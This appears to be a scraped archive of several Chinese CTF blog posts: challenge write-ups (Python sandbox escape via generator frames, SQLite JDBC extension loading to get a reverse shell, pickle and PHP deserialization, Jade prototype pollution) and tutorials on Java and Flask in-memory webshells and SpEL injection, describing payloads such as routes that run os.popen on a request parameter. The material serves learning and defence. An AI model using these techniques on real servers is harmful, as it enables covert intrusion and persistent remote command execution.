根据引入猜测一下，他是从handlers中引入的，而name_index里有 handler 继续进入，查看： oh，找到了directory_handler，那接下来就是获取它并修改其属性了，他是一个functools.partial，还不能直接选择这个directory_handler，接下来从args、func、keywords都试试： 可以看见keywords能够获得到我们的DirectoryHandler(directory_handler) 跟进，这个时候变成了字典，所以可以直接调用： 这正是我们想要的： directory_view 修改！ 默认是false，利用pydash，修改为True 本地网页测试发现报错： keyError? 这里重新写一下payload测试： 发现居然变成了： 奇怪，变成了__mp_main__.static，那就把里面的改一下，继续测试： 这下正常了： 页面污染测试，这里得参照上面的方法，把前面的app.router添加__init__\\\\\\\\.__globals__ 发现还是不行，晕 这里gxngxngxn师傅给出的解释是： 不能够用[]来包裹其中的索引，因为污染和直接调用不同，需要用.来连接，而__mp_main__.static是一个整体，所以只需要两个\\即可 师傅tql，立马修改payload 这下终于是两个True了，真不容易 访问/static，因为我们的flag肯定不在当前目录，所以我本地只放了一个1.html在static目录里 接下来就是污染目录了 回看directory_handler里面有什么东西我们可以污染利用，上文说过directory是保存的哪个文件夹下的文件，很明显只需要污染directory即可 但是直接污染会报错： 没绷住，不能够直接将directory污染成str 查看directory: Path，说明他是一个Path的对象 再看看它是怎么赋值来的： 好像找到了，关键词搜索get，这里的注释是返回绝对路径 查看一下_from_parts 如果这里能debug的话，一下子就出来了，但是我用的是vscode，debug不了T_T 可以看到有个parts对象，返回给了_parts，上面说过，parts相当于路径的切片 此时可以去查看directory的_parts了： 果不其然，是个切片 污染他就好了： 这样就能拿到flag了 去ctfshow复现测试： 可以看见flag名了，但是直接读是读不到的。 还记得上面能够进行任意文件读吗，再利用一次即可得到flag： 参考了gxngxngxn师傅的博客文章 sanic内存马 参考flask内存马，那我们也可以在sanic里找到能够利用的添加路由的方法 app.add_route(handler, &quot;/test&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;]) 所以能参照flask的马儿写一个sanic的，注意它的handler其实就是flask里的实现方法： handler (RouteHandler): Function or class-based view used as a route handler. 第二天 cms_revenge 把qrcode给修了，但没完全修复，只加了文件头检验，在302跳转的文件加个GIF89a即可： 操作同上 mossforn pyjail，代码如下 main.py main.py负责接受我们的代码，然后将其创建一个新的python文件到uploads文件夹下，这个python文件经过测试会生成两个文件，一个.py，一个.txt .py复制的是runner.py里的内容 .txt是我们的代码 runner.py： runner.py就是通过读取生成的txt内容，并且执行 这里经过了三重过滤： source_simple_check()，检测双下划线、getattr、exit，以及检查是否输入的是ascii范围内的符号 block_wrapper，定义的是audit hook，使用的黑名单，这几个都不能用，而且由于audit hook处于python的底层实现，所以无法通过常规变换绕过 source_opcode_checker，将传入的代码变成opcode，防止加载globals、name、method这些操作 几乎无懈可击啊T_T 但是还是通过一个trick绕过了 这就是大名鼎鼎的栈帧沙箱逃逸 生成器 利用yield关键字来定义一个生成器。yield用于产生一个值，并且在保留当前状态的同时，暂停函数的执行。当下次调用这个生成器的时候，函数就会从上次暂停的状态继续进行。直至遇见下一个yield状态或者程序结束 example: 生成器的return返回值必须从stopIteration异常中获取： 生成器的属性 生成器有如下属性： gi_code：生成器对应的code对象 gi_frame：生成器对应的frame(栈帧)对象 gi_running：判断生成器的函数是否正在执行。生成器函数在yield以后，执行yield的下一行代码前处于冻结状态，此时gi_running为0 gi_yieldfrom：如果生成器正在从另一个生成器中yield值，斥责该对象为生成器对象的引用，否则为None gi_frame.f_locals：一个字典，包含生成器当前帧的本地变量 关键在于gi_frame。它指向生成器或者写成当前执行的帧对象。如果这个生成器或者协程在执行的话，帧对象表示的是代码执行的当前上下变量、执行的字节码指令等信息 输出结果如下： 栈帧 Python中的栈帧，也称为帧，是用于执行代码的数据结构，每当python执行一个函数或者方法的时候，就会新建一个栈帧，用于储存该函数或者方法的局部变量、参数、返回地址以及其他执行相关的信息，这些栈帧会按被调用的顺序组织成一个栈，也叫调用栈 frame的几个属性： f_locals：一个字典，包含了函数或者方法的局部变量。字典中：key是变量名，value是变量的值 f_globals：一个字典，包含了函数或者方法的全局变量。字典中：key是全局变量名，value是变量的值 f_code，一个代码对象，包含了函数或者方法的字节码指令、常量、变量名等信息 f_lasti：整数，用于表示最后执行的字节码指令的索引 f_back：指向上一级调用栈帧的引用，用于构建调用栈 栈帧逃逸 利用就是通过f_back，可以理解为回到前一帧，此时就能够逃逸出去，获取到globals全局符号表，比如下面这个代码，将builtins置空： 因为将builtins置空了，所以我们不能够直接使用next函数来获得帧，可以改成下面的形式： 这样就能够正常获取到帧了 通过帧获取到flag，flag可能会有以下几种形式存在： flag是常量，写在了运行的这个python脚本里，但是我们不知道里面的内容。此时由于是常量，我们就可以通过f_code后取到代码对象，从而获取到常量 测试结果如下： 可以看见我们获取到了THIS_IS_THE_FLAG常量 flag是变量，通过以下几种方式引入： 读取某个文件的flag(open('xxx').readline().strip()) 引入某个py文件from secret import flag 注，可以通过dir()查看某个东西里面的东西，例如dir(__builtins__) 骚操作 通过栈帧逃逸修改globals里的函数，比如L3HCTF 2024里的interactive problem revenge 题目描述的是让我们写一个算法，在5秒钟内分解一个大数，且分解出来的p q必须大于10万 其中它的代码如下： 通过我们的代码获取p，q。然后计算p、q是否等于int(&quot;69627....863&quot;) 可以看到这个很有讲究，用int()括住了这个大数。由于int采用的是globals里的int()，所以我们可以通过将int()覆盖成我们的一个函数让它通过 比如fake_int如下： 我们的code如下： 返回的字符串1和2经过int判断长度小于100，返回了123123，而大数长度很大，返回的是123123*123123。导致p*q = 这个大数 回到本题 由于这个题的flag存在于runner.py里，(main.py里将flag读取，然后把固定字符替换成了FLAG) 所以直接将payload这么写，注意由于双下划线被过滤了，记得改一下： 最后一步，因为它检测了输出有没有flag，如果有就会输出这 runtime什么的 所以我们不能够直接输出flag，而是得慢慢判断，因为返回的内容是一个小括号括住的(忘了叫set还是叫tuple了，总之可以通过下标获取) 所以可以通过这样的方式来逐步获取flag的位置： 假设第x个输出了runtime什么的，第x-1个正常，那flag就是[x] 这下就能确定flag在第12个位置。观察可以通过code.co_const[11:12]得到一个只含有flag的小括号 用code.co_const[11:12][0]取出，然后慢慢输出flag即可： 因为比赛结束环境开不了了，所以只能本地复现了 如果嫌麻烦可以拿到 builtins的str函数把这个tuple变成str： 补一张复现的图，因为ctfshow没有国赛那个界面，所以显得很简陋，手动补\\n换行和空格缩进即可 payload： ezjava 哈哈，没想到是jdbc打sqlite，失策了。死磕mysql的后果是目光呆滞 后续学习jdbc attack的时候再把这几个数据库的打法整理一下 jadx反编译jar得到几个点： lib里基本上没有能打的链，log4j也是2.13版，甚至把jackson删了（至少打不了是真的 包名就叫jdbcTest，所以肯定是打jdbc pom.xml如下： 给了三个数据库，一个mysql，一个pgsql，一个sqlite 然后看controller IndexController没什么好看的，主要看JdbcController，它传了一个jdbcBean对象进去，然后测试其连通性，其他的bean也没什么有意义的东西，定义了几个类的setter方法和getter方法，只有userBean里有readObject方法，但是jdbc很明显不是打这个userbean的 点进this.datasourceServiceImpl.testDatasourceConnectionAble()里，发现了三个sql的测试连接方法： 先说结论，三个数据库我只测了mysql T_T，因为我只学了mysql的打法，然后测试的时候发现index页面会帮你传入这个jdbcBean了，就直接在post包里改url即可 这是当时测的，mysql能打，但是没有反应，jdbc确实连到我的fake_mysql服务器上了： 然后，然后就没有然后了。打不了反序列化 pgsql没测，这里放一下y4神写的exp： JavaSec/9.JDBC Attack/PostGreSQL/index.md at main · Y4tacker/JavaSec · GitHub 看了几眼，原理大概是 DriverManager.getConnection会导致在org.postgresql.util.ObjectFactory#instantiate可以初始化任意类，这里找到了org.springframework.context.support.ClassPathXmlApplicationContext，这个函数本来就是初始化spring配置的，这里可以解析远程xml配置文件实现RCE。似乎在这里也不行 sqlite其实很鸡肋，只能做ssrf，但是这是在普通的情况下。如果开启了允许加载拓展的话，就能够加载恶意so文件打rce了() 还是看看y4神的分析吧： JavaSec/9.JDBC Attack/SQLite/index.md at main · Y4tacker/JavaSec · GitHub 当sqllite建立连接是会调用org.sqlite.core.CoreConnection#open 这个时候进extractResource 简单看看这个流程，能够通过访问这个resourceAddr，然后能够将文件写进定义好的java.io.tmpdir目录，文件名叫sqlite-jdbc-tmp-xxx.db，xxx是resourceAddr的hash值，我们可以通过本地调试测出这个hash值 这里的结果只和后面的exp.so有关系，这里改成 所以说它会把文件缓存进/tmp，但是如果没有允许加载拓展的话，就只能做到这种地步了 回到这里，看看SqliteDatasourceConnector： 可以看到他这里允许加载extension，此时就可以利用 &quot;CREATE VIEW &quot;将不可控的SELECT语句转换为可控。 如果我们能够控制SELECT语句，我们可以使用SELECT load_extension('/tmp/test.so')来加载dll/so并执行恶意代码，注意前面源码写入so的时候已经被重命名成jdbc-sqlite-tmp-xxx.db了，所以这个时候要变成SELECT load_extension('/tmp/test.so') 这里看以下su18师傅的攻击示例： 可以看到还需要读一次表，而这个DataSourceConnector里面就有这个操作，而我们只需要写好表名即可 payload怎么写的 Jdbc碎碎念三：内存数据库 | m0d9’s blog 参考它可以先写一个恶意的so 先安装sqlite环境： gcc编译成so： 写完so以后打一次请求： 本地跑一下这个jdbc:sqlite::resource:计算出hashCode，记住他重命名为了sqlite-jdbc-tmp-xxx.db su18师傅有现成的poc.db，下下来用就行了，表名就是security，把里面的内容改一改。这里可以用navicat改，也貌似可以用010Editor改 第二次请求打poc.db，记得添加tableName： 监听反弹的port，等shell弹过来即可，比如我这里通过debug测得文件名为：sqlite-jdbc-tmp--741179700.db 此时请求如下： shell就弹过来了： 可惜线上没做出来，只能复现了 补充注意点 如上图，写入exp.so的时候不要写tableName，否则会因为根本没有写入表导致SQL Exception，然后直接没有写入so"},{"title":"山警网络空间安全实验室比赛的复现学习","date":"2024-05-17T08:49:17.000Z","url":"/posts/48037.html","tags":[["Web","/tags/Web/"]],"categories":[["CTF","/categories/CTF/"]],"content":"自己没打，但是朋友提了两嘴就去看了一下，题目还挺有意思，学习一下 myfavorPython 注册账户后进入一个页面，能够进行python反序列化，需要提交base64的payload。 python反序列化想到pickle，直接打pickle的payload就好了 有现成的就不想写reduce版本的了，如下： 反弹shell后flag在当前目录下的flag.txt，shell有点不稳定，所以要尽快操作 简单看扒一下源码： 根据源码反推过程，开了debug模式，我们也可以利用异常带出： 逃跑大师 一眼顶针，鉴定为php反序列化逃逸 将SDPCSEC变成了SanDieg0，多了一个字符 现在看一下问题所在，自定义的substrstr函数： 我们可以控制B和C，再看mb_substr 这里建议翻菜鸟教程对函数的解读，它提及了一点，如果length是负数，就会从字符串的末端返回，如下图： 这里除去了从末尾开始计数的2个字符，所以我们能不能根据这个特点来截取到我们想要的字符呢 这里B和C我们是可以控制的，要想控制length为负数很简单，只需要end+1-start小于0，那将B设置为]，end=0，那长度就是1-start，start就是[welcome sdpcsec的这个[，所以B填充多一些垃圾内容，就能够变成负数的length 问题是payload放B还是放C呢？ 如果放C，那start一定是从B里面选或者从[welcome...来选，无论截取的长度为多少，一定会截取到welcome sdpcsec这个垃圾数据，所以只能够放B里 放B里，通过从后往前截取就能截取到我们想要的payload 那整个字符串就变成了 但是新的问题就是无论如何我们都会截取到这个[]，那要怎么办呢？ 其实不用担心，因为在php反序列化里有过一个利用数组调用类函数的操作，具体咋样我忘了T_T，忘记记录下来了，总之就是通过一个数组调用 也就是说这样也是可以调用的 所以payload就不用管了，还是这样 那中间要加多少个x呢？ 先看一下length变成了1-start，截取到-19，所以+19个x： 不对，少了两个，所以减少两个x： 这样就OK了 接下来来序列化整个数据，做逃逸： 大概长这样，我们要对A进行逃逸，结果就长这样： 我们原本的结果长 要逃逸就变成： 长度为68，多加68个SDPCSEC： payload 长这样 逃逸后的payload长这样： 写个shell吧，不然每次都要手搓，太累了 这里的反斜杠算一个字符，所以删掉一个SDPCSEC和反斜杠 记得把反斜杠删掉，变成： Ezzz_proto 源码如下： POST路由有merge函数进行原型链污染，可以看到index.jade，所以可以去搜索jade原型链污染： jade原型链污染rce分析_jade 原型链污染-CSDN博客 本地打打不通，所以得看它的原理（需要force step into） 跟着这篇文章分析： 入口在res.render 跟踪到tryRender，到view的render方法 进到view.render查看： 进入到this.engine，跟进exports.__express里的exports.renderFile，返回值有个处理模板缓存的函数，跟进，这里不能够debug了，只能手动跟进 返回的templ由exports.compile返回，跟进 简单讲一下逻辑 前面获取到options和str，parsed由parse(str, options);返回，检查是否开启debug模式，如果开启将fn赋值成一个东西，没开启的话就变成parsed.body，所以这个parsed.body还是挺重要的，有可能可以打rce 后面就是给fn创建一个函数，调用fn自己。res能够调用fn函数，所以如果能调用res就能够调用fn 前面处理缓存的时候返回的是function()()的形式，相当于第一次返回的是函数，再调用返回的函数。所以res能够被调用，关键点在于parsed.body 跟进parse，写注释里了 所以无论self是true还是false，都会拼接js进去，js又成关键了 跟进compiler.compile() 这里进入之后就能看到和平时的不同 前面的还是一样： 这里就是不同之处了，调用的是visitCode 之前调的是visit 跟进 这里拼接的是val这个变量了，如果code.val没有的话，就可以直接污染，那就是污染val这个值即可 前面还要污染compileDebug和self，详见前面的分析过程 payload将line改成val即可，无回显可以反弹shell： payload： Python-revenge 大同小异，只不过将debug模式关了，然后重新限制了一些东西 这两个waf怎么绕呢，题目环境还是不出网的 不出网，无debug模式，还要rce，那不就到我们的内存马登场了吗？ 所以这里才限制了before和after，因为内存马有before_request和after_request 那简单，换用error_handler即可： payload前面文章有"},{"title":"javaweb与tomcat","date":"2024-05-15T11:45:56.000Z","url":"/posts/23430.html","tags":[["java","/tags/java/"]],"categories":[["java","/categories/java/"]],"content":"简单了解javaweb三大件 javaweb三大件 上面说过javaweb的内存马有三种，servlet、filter、listener 所以javaweb三大件就是servlet、filter、listener servlet servlet是一个运行在web上的程序，处在一个中间层的位置(在http客户端的请求和http上的数据库或者应用程序之间)。 servlet对请求的处理过程如下： 客户端发送http请求，比如一个get/post请求等 servlet接收请求，并且根据请求的信息封装成HttpServletRequest和HttpServletResponse对象 servlet调用init()方法，init()只在第一次请求时被调用 servlet调用service()方法 servlet根据请求类型调用相应的doxxx()方法，比如get型就调用doGet()，该doxxx方法内写的就是我们自己的业务逻辑 处理完成后，将结果返回servlet，然后再由servlet返回给客户端 调用destory方法 servlet的生命周期： 服务器启动(web.xml中配置load-on-startup=1，默认为0)或者第一次请求servlet的时候，调用init() servlet处理请求，调用service(ServletRequest req, ServletResponse res) 关闭时，调用destory方法销毁这个servlet对象 jvm进行垃圾回收 filter filter称为过滤器，是对servlet技术的一个强补充。在HttpServletRequest到达servlet之前，拦截下这个对象，然后检查该对象或者修改其中的Request头和数据。同样地，在HttpServletResponse到达客户端之前拦截下这个对象，然后检查该对象或者修改HttpServletResponse头和数据 简单点说就是filter就像是一个保安，分别拦截Request和Response对象，然后根据需要对其进行检查和修改再放行 filter的工作原理 filter程序是一个实现了特殊接口的java类，和servlet类似。由servlet容器进行调用和执行 在web.xml注册了一个filter来对某个servlet进行拦截处理的时候，filter可以决定是否将请求继续传递给servlet程序，还可以对请求进行修改 当servlet容器开始调用某个servlet程序的时候，如果发现了它已经注册了一个filter程序对servlet进行拦截的时候，容器就不会再直接调用service()方法，而是先调用doFilter()方法，然后再由doFilter()方法决定是否去执行service()方法 一些细节就是在doFilter里也不是由doFilter直接调用service方法，而是调用FilterChain.doFilter方法来调用service方法。而FilterChain对象是通过Filter.doFilter方法的参数传递进来的 只要在调用FilterChain.doFilter方法前后增加某些程序代码，就可以在servlet进行相应前后实现某些特殊功能 如果Filter.doFilter方法没有调用到FilterChain.doFilter方法的话，就不会调用service方法，这样通过filter就可以阻止某些非法的访问请求 filter的生命周期 与servlet一致，filter的创建与销毁由容器负责 web应用启动时，创建filter对象，并调用其init方法，读取web.xml，完成对象的初始功能，为拦截做好准备工作，其中filter和init方法都只会执行一次 开发者可以通过init方法的参数，获得代表当前filter配置信息的filterconfig对象，filter对象创建后会驻留在内存，当web应用移除或者服务器停止的时候才销毁 在Web容器卸载 Filter 对象之前被调用。该方法在Filter的生命周期中仅执行一次。在这个方法中，可以释放过滤器使用的资源。 当多个filter同时存在的时候就构成了filter链，此时会根据在web.xml中的注册顺序来决定先调用哪个filter。当第一个filter的doFilter方法被调用的时候，web服务器就会创建一个代表filter链的filterchain对象传递给该方法。通过判断filterchain中是否还有filter来决定后面是否继续调用filter Listener javaweb中的监听器，是application、session和request三大对象创建、销毁或者增删改时自动执行代码的功能组件 ServletContextListener，顾名思义是对Servlet上下文的监听。对servlet上下文的创建和销毁进行监听 ServletContextAttributeListener，监听servlet上下文属性的监听器(增加、删除、替换) HttpSessionListener，对session的创建和销毁进行监听。session的销毁又有两种情况：session超时、调用session对象的invalidate()方法使其失效 HttpSessionAttributeListener，对session的属性的增加、删除、替换进行监听 ServletRequestListener，对请求对象的初始化和销毁进行监听 Listener可以用于监听客户端的请求、操作等。通过listener可以触发一些动作，比如监听用户的在线数量、网站访问量等 Tomcat 汤姆猫（ tomcat作为web服务器实现了两个核心功能： HTTP服务器功能。进行socket通信(tcp)，解析http报文 Servlet容器。加载和管理Servlet，由Servlet具体负责处理Request请求 tomcat以上的两个功能对应着tomcat的两个核心组件：Connector和Container。Connector负责对外交流(http服务器)，而Container负责内部(Servlet功能) Server：tomcat服务器 Service：服务器内部的组件，一个Server可以拥有多个service，它能过将若干个connector组件绑定到一个container Connector：连接器，是service的核心组件之一。主要连接客户端请求，并且接收请求然后将其封装成Request对象和Response，交给Container进行处理，在Container处理完毕后交给Connector返回给客户端 Container：容器，负责处理用户的Servlet请求 对于Connector，他需要完成三个功能 Socket通信 封装请求变成Request对象 Request转换成ServletRequest对象，将Response转成ServletResponse 所以Connector也有对应的三个组件分别负责上面的三个功能(反过来也是一样的，这里描述的是请求)： EndPoint，负责TCP/IP通信，提供请求字节流给Processer Processer，提供Request对象给Adapter Adapter，提供标准的ServletRequest对象给Container 其中EndPoint和Processer的组合又叫ProtocolHandler 对于Container组件，它又叫Catalina Container又有四种容器，分别叫 Engine，是整个组件的Servlet引擎，用于管理多个虚拟站点，一个Service最多只有一个Engine，而一个Engine可以有多个host Host，一个站点/虚拟主机，可以给Tomcat配置多个虚拟主机地址，而一个虚拟主机地址下面可以包含多个Context Context，表示一个web应用程序，每一个Context都有唯一的路径，一个web应用有多个wrapper Wrapper，表示一个Servlet，负责管理整个Servlet的生命周期，包括装载、初始化、回收等 Tomcat的container又可以由下图概括： "},{"title":"java内存马学习 - 介绍","date":"2024-05-15T11:11:46.000Z","url":"/posts/25574.html","tags":[["java","/tags/java/"]],"categories":[["java","/categories/java/"]],"content":"学习java内存马 java内存马介绍 内存马总之就是一种技术，能够将🐎放到内存里，即使没有jsp也是能够正常运行并且执命令的 同flask内存马一样，内存马都需要实现动态注册路由来实现。 对于java内存马，有如下分类： 传统型内存马 Servlet型内存马 需要动态注册Servlet以及映射 Filter型内存马 需要动态注册Filter及映射 Listener型内存马 需要动态注册Listener javaweb将servlet、filter、Listener等以及其处理类放在context中，并在程序运行时进行查找和匹配。这种内存马就是通过将代码添加到context的关键位置中。 Spring内存马 Controller型 动态注册Controller及其映射 Interceptor型 动态注册Interceptor及其映射 Webflux型 动态注册webfilter及映射路由 tomcat内存马 valve型内存马 动态注册valve upgrade型 动态注册upgradeProtocol executor型 动态替换全局executor poller型 动态替换全局poller Grizzly filter型 动态注册Grizzly filter 其他内存马 websocket型 动态注册websocket以及处理逻辑 tomcat JSP内存马 动态注册tomcatjsp管理逻辑 线程型 动态加载一个无法杀死的线程 RMI型 动态启动RMI Registry Agent型内存马 通过hook并修改关键方法添加恶意逻辑 Agent型内存马在冰蝎和哥斯拉上都有实现 实际上agent型内存马可以hook很多位置，还可以挖掘出更多的内存马的利用方式 按照另一种分类方式可以分为： 冰蝎🐎 哥斯拉🐎 蚁剑🐎 命令回显🐎 流量隧道🐎 java内存马应用范围 java内存马的使用范围： 因为网络原因反弹不了shell的(不出网) 反向代理暴露web端口的 没有文件写权限的 写不了普通🐎的(写马后会告警监控的) springboot等框架无法解析webshell的 对看不懂内存马的（（（（ 但是内存马还是有缺点的： 服务器重启后会失效 目前技术已经能够查杀出内存马 "},{"title":"Flask内存马学习","date":"2024-05-14T11:51:52.000Z","url":"/posts/4656.html","tags":[["Web","/tags/Web/"]],"categories":[["CTF","/categories/CTF/"]],"content":"要学内存马了，先学点简单的，从flask内存马开始 内存马简介 内存马内存马，众所周知就是写在内存里的webshell，而且不会写文件到系统里（ 大嘘，总之内存马就是一种webshell，这种webshell和平时不同的是这种webshell不会生成文件，而是存在于内存当中为我们调用，而成功打内存马之后会有一个新的路径例如/shell，这个路由并不真实存在，但是可以供我们访问，我们便可以在这里进行rce，而且是有回显的 因此，在无回显不出网的命令执行里，一般可以选择使用内存马进行攻击 flask内存马 对于java的内存马分为几类： filter型 servlet型 listener型 但是其本质都是通过动态注册 Servlet或者filter及其映射路由，以及动态注册listener进行攻击的 因此能否动态注册便成为了我们能否打内存马的关键，回到flask，我们不管是出题还是写开发要利用到flask框架的大概都知道，写一个路由的时候都需要用@app.route('xxx')，这是flask常规注册路由的方式 而实际工作的函数为该装饰器里调用的方法：self.add_url_rule()，如图： 通过上面的图还可以得到add_url_rule具有三个参数： url，和app.route的第一个参数一样，必须以/开始 endpoint，使用url_for进行反转的时候传入的第一个参数，也可以不填，默认为函数名 view_func，只需要写方法名，无需添加括号，该页面实现的方法函数 也就是说可以通过该方法手动添加一个路由，关键就在于利用view_func让该页面实现我们的函数即可。view_func需要实现获取参数、执行命令、返回结果这三个方法。 一篇文章里讲述了flask路由的工作原理： 实例化一个Request Context，该上下文请求将请求的信息封装到了Request中 Context入栈，这个栈叫_request_ctx_stack 省流：如果我们想获取到这个参数，也就是request的上下文，就只需要获得这个栈的栈顶，也就是_request_ctx_stack ssti与内存马 因此我们就可以通过ssti执行这个函数，构造一个路由： 看着一坨，实际上很好理解： lambda：一个匿名函数，实际上就是/shell这个路由绑定了下面这个函数__import('os').popen(_request_ctx_stack.top.request.args.get('cmd')).read() eval：eval其实有两个参数，eval(expression, globals)，可以看见匿名函数里有app和_request_ctx_stack，这两个需要通过eval的第二个参数进行声明，并从全局命名空间里被找到。简单的说就是在eval的第二个参数里定义app和这个stack在哪里找得到。注意globals必须是一个字典 实践 提示：此部分在高版本flask下已经失效，add_url_rule已经不能够再生效了，如需高版本下的flask内存马，请看下文 简单整一个ssti，但是此处模拟无回显+不出网的效果： 如果url_for没有current_app，可以换成get_flashed_messages： 此处将源码修改为无回显情况： 测试我们的内存马： flask高版本下是不行了？还是我姿势不对。。。 晕，不纠结了，也不太重要，payload放这里 哦对了，要记住，这里是通过render_template_string才能触发的哦 bypass 参考ssti的bypass url_for == get_flashed_messages exec == eval 中括号里的字符串可以拼接 过滤中括号可以利用getitem __globals__ 可以利用__getattribute__('globals')替换 编码绕过、requests等 两个变形payload： 高版本下的flask内存马 既然add_url_rule失效了，那我们就需要找其他的方式添加路由了，几个钩子 Flask 学习-67.钩子函数 @app.before_request 官方文档里，@app.before_request的作用就是注册一个在每次请求之前先运行的函数 往下看它的实现，是before_request_funcs 那照猫画虎一下，其实就是利用app.before_request_funcs.setdefault(None, []).append(f)，本质是注册一个函数，所以f就是我们利用的lambda匿名函数 那就可以手搓一个payload如下(ssti)： 为什么用get_flashed_messages已经在上面说过了，是因为我的url_for没有current_app 测试环境： 可以看到内存马已经生效了： 如果不想这么麻烦的话，其实app等效于：__import__('sys').modules['__main__'].__dict__['app']，request可以直接写命令，例如： 如果没有直接的ssti点就可以用这个payload打 这个形式的内存马还是很漂亮的(起码比下面那个好看的多) 但是这么好看的内存马还是有缺点的（会影响到主机的正常业务，但是你都打ctf了还在意这主机有没有问题？） @app.after_request before_request的好兄弟after_request，顾名思义他是在请求之后生效的 同样翻文档找一下它的实现函数，如果没猜错的话应该是after_request_funcs： 还真是 再找一下它是怎么写这个函数的： 网图找不到了只能自己翻vscode找flask的源码了 利用s.app.after_request_funcs.setdefault(None, []).append(f)打，但是这里有一些限制就是。after_app_request需要返回一个response对象，这就是这个函数比较难接受的地方 我们还需要通过make_response重新生成一个response，带着我们rce后的结果返回 简单地说就是重写一个函数，如果有cmd这个请求就返回make_response(os.popen(request.args.get('cmd')).read())，否则直接返回resp 写成lambda函数如下： 写成ssti 属实不怎么好看。。。但是能用 不推荐使用该方式写内存马() @app.teardown_request teardown_request是在每次请求后，即使遇到了异常情况，都会绑定一个函数。如果有相关异常信息抛出，它会接受异常信息 同样利用：self.teardown_request_funcs.setdefault(None, []).append(f)来注册一个函数 所以他们是三兄弟（ 直接写payload了，注意这个函数会接受异常信息，所以要加个参数： 可惜它是无回显的，只能够通过写文件测试效果： 严格意义上这个已经不能被称为内存马了，故不太推荐，只有在允许写的情况下才能拿到结果 error_handler 另一个能够处理错误的就是error_handler。flask给出的实例是通过该方法自定义404页面和500页面： 在调用时会调用register_error_handler 调用了error_handler_spec整了个一个函数 看一下逻辑：none不用管，code和exc_class是_get_exc_class_and_code得到的，我们可以照写，这里可以返回status code，假设状态码为404： 此时exc_class, code = _get_exc_class_and_code(404) 我们再覆盖404页面的f即可，当访问不存在的页面的时候进行error_handler处理就能够处理404页面时调用我们的恶意函数 这个app还是可以等效替代成内什么__import__('sys').modules['__main__'].__dict__['app']的 ssti版本，大同小异： 这里对error_handler的理解比较浅显，大致可以理解成flask利用error_handler处理异常时利用上面所说的几个函数注册了自定义异常页面，然后我们就可以通过这几个函数覆盖错误页面的函数f，导致访问404页面的时候造成rce，详细的追踪过程可以去看gxngxngxn师傅的这篇文章 ssti_version 小总结 原始版 @app.before_request @app.after_request @app.teardown_request error_handler pickle version 假设有些时候不给你ssti，给你pickle，那你要怎么办呢？ 上文说过app可以通过__import__('sys').modules['__main__'].__dict__['app']来拿 这里request也不一定要在全局定义，所以我们只需要处理app的问题即可： 简单写个pickle路由处理 写个大杂烩： 测试截图就不放了，都能打，除了teardown是无回显的要自己测以外 不过都打pickle了，方法不止内存马一种，比如开启debug模式的时候就可以通过raise Exception带出命令等 参考文章： Python Flask内存马的另辟途径 - 先知社区 (aliyun.com) "},{"title":"SPEL表达式注入","date":"2024-05-07T07:27:26.000Z","url":"/posts/56097.html","tags":[["java","/tags/java/"]],"categories":[["java","/categories/java/"]],"content":"学习SPEL表达式注入 spel是什么 spel全称Spring Expression Language，SPEL可以基于xml和注解、bean的定义一起使用 spel是表达式计算的基础，实现了spring生态的无缝对接巴拉巴拉的，懒得写了，直接进正题好了 spel定界符 spel使用#&#123;&#125;作为定界符，所有大括号中的字符都被认为是spel表达式，在其中可以使用spel运算符、变量、引用bean的属性和方法等 spel可以： 使用Bean的ID来引用Bean 可调用方法和访问对象的属性 可对值进行算数、关系和逻辑运算 可使用正则表达式进行匹配 可进行集合操作 注意#&#123;&#125;和$&#123;&#125;的区别 #&#123;&#125;是spel的定界符，用于指明内容为spel表达式并且执行 $&#123;&#125;主要用于加载外部属性文件中的值 二者可以混合使用，但是#&#123;&#125;必须在$&#123;&#125;的外面 spel表达式类型 最简单的spel表达式仅包含有一个字面值。 在xml配置文件中设置类属性为字面值 此时需要用到#&#123;&#125;定界符，注意如果是字符串的话，需要利用''单引号括起来： 设置好Bean id： 还能够和字符串混合使用，如下： java的基本数据类型都可以出现在spel并且使用 例如上面的例子就是科学计数法的例子 demo 一个helloworld.java: main.java： 编写Beans.xml，先创建一个Spring Config的xml文件 然后编写Bean id： 此时注意，最重要的一步来了： 将编辑好的Beans.xml复制到/target/classes文件夹内，否则会直接报IOExecption Beans.xml does not exist 此时运行主程序即可，运行结果如下： 除了字面值以外，spel还能够引用Bean，如下，直接在界定符#&#123;&#125;中写入Bean id即可： 无需利用单引号括起来 还能够引用类属性： 比如，carl参赛者是一位模仿高手，kenny唱什么歌，弹奏什么乐器，他就唱什么歌，弹奏什么乐器： 此时spel表达式指定了kenny的属性，等价于执行下面的命令： 还可以引用方法： 假设现在有个SongSelector类，该类有一个SelectSong方法，可以返回随机选择的歌曲，spel表达式如下： 如果要返回大写的歌曲名： 但是这里还得确保spel表达式不会抛出NullPointerException(神经) 此时只需要利用null safe存取器： ?.能够确保左边的表达式不为null，如果为null的话就不会调用toUpperCase函数 引用bean的demo 例如某类ExampleClass ExampleClass2： Beans.xml 这里通过spel表达式获取到了exampleClass对象，Constructor-arg相当于调用有参构造函数，输出结果如下： T(type) 这个应该就比较有印象了，使用T(type)相当于new type 但是使用T(type)的时候，type必须是类全限定名，比如java.lang.Runtime等 但是java.lang包可以除外，因为spel已经内置了这个包，使用该包下的类剋不指定具体的包名 T(type)还可以访问静态方法和静态字段 例如调用Math.random()获取随机数： 利用SpelExpressionParser： 例如上面这个例子，两个输出的结果是等效的 利用T(java.lang.Runtime)弹计算器： 写进xml： spel用法 spel有三种形式的使用方法，上面已经用过两种： xml SpelExpressionParser @value 其中前两种前面有使用方法，这里不再赘述 简单看一下@value的使用方法： 然后具体看一下SpelExpressionParser的，因为后续的各种spel注入都是基于Expression形式的spel表达式的 spel表达式求值一般分4步： 首先构造一个解析器，也就是SpelExpressionParser parser = new SpelExpressionParser(); 然后解析表达式，也就是Expression expression = parser.parseExpression(&quot;('aaa'+' bbb').concat(#end)&quot;);，注意这里#end 接下来需要解析上下文，这里#end要根据上下文来得到值，具体代码写在下面 最后就可以得到表达式运算后的值getValue(context)，这里需要通过Expression接口的getValue方法根据上下文获取到表达式的值 总结成代码如下： 这里利用了几个接口： ExpressionParser接口：解析器，使用parseExpression方法将字符串表达式转换为Expression对象 EvaluationContext接口：作为上下文环境，使用setRootObject方法设置根对象，通过setVariable方法来注册自定义变量，使用registerFunction注册自定义函数等 Expression接口，使用getValue来获取表达式值，使用setValue来设置对象值 example： spel表达式 运算符类型 运算符 算数运算 +, -, *, /, %, ^ 关系运算 &lt;, &gt;, ==, &lt;=, &gt;=, lt, gt, eq, le, ge 逻辑运算 and, or, not, ! 条件运算 ?:(ternary), 